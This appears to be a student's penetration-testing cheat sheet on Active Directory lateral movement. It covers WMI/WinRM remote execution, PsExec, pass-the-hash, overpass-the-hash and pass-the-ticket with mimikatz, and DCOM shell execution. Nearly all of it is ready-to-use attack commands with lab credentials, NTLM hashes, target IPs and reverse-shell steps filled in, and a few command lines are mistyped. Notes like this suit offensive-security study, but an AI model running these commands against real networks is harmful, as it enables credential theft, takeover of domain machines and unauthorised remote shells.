## WMI and WinRM: 
(We can gain rev shell jst by having user creds)  
We can create process on remote target if we have Domain Admin creds. Thus if we have domain admin creds we can gain reverse shell of any target in AD.

```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc" (Creating calculator process by using jen creds(DA))
```
Does it work? (Return Value should be 0) 
##### Creating PS-Credential Object for gaining reverse shell 
LINUX:
```powershell
$username = 'jen'; (change this)  
$password = 'Nexus123!'; (change this)  
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;  
$credential = New-ObjectSystem.Management.Automation.PSCredential$username,$secureString;  
$Options = New-CimSessionOption -Protocol DCOM  
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options (target)  
$Command = 'powershell -nop -w hidden -e';(powershell one liner)  
start listener  
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command};
```
WINDOWS:  
```
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
and
start listener
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e "
```
Note: For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

##### Powershell Remoting
```
New-PSSession -ComputerName 192.168.50.73 -Credential $credential 
Enter-PSSession 1 (we'll get shell)
```
**PSEXEC**: (we can get shell of users if we have their creds)  
Note: User must be part of admin local group, ADMIN$ share must be available and File and Printer Sharing has to be turned on
```
./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

## PASS THE HASH (PASSING NTLM) 
(Use when you can't crack the hash) (Port 445 required) 
Note: ADMIN$ share must be available and File and Printer Sharing has to be turned on
```
smbclient \\\\ip\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b (PTH for smb share)  

impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b user@ip 
(LMHash:NTHash we don't know lmhash so we use 32 0's)  

impacket-wmiexec-hashes:2892D26CDF84D7A70E2EB3B9F05C425EAdministrator@192.168.50.73
```

## OVER PASS THE HASH: (Abusing NTLM to get TGT and TGS)  
```
sekurlsa::logonpasswords
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

whoami wont show new user name as it checks current process token and does not check kerberos ticket 
```
klist (nothing might be cached and its normal)  
net use \\files04 (Generating TGT in cache by authenticating to the file server)  
klist (this will show TGT)
.\PsExec.exe \\files04 cmd (psexec rely on kerberos auth so it works here)
```

## PASS THE TICKET
TGT can be used only on the acquired machine, whereas TGS offers flexibility. It can be exported or re-injected anywhere in network.  
If any reource is not accessible for our user and if its accessible for other user we can use this to get the privilegedd user's TGS to access that resource.
```
ls \\web04\backup (Not accessible?)  
sekurlsa::tickets /export (exports TGT and TGS in kirbi format)  
dir *.kirbi  
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi (injecting the ticket) 
klist  
ls \\web04\backup
```

## DCOM
COM - Creates software components that interacts with each other 
DCOM - Same but interacts with multiple computers in network 
Note: Our user should be local admin

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73")) (ip of target you wanna gain shell)

start listener

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell-nop-whidden-e","7")(pwsh one liner)
```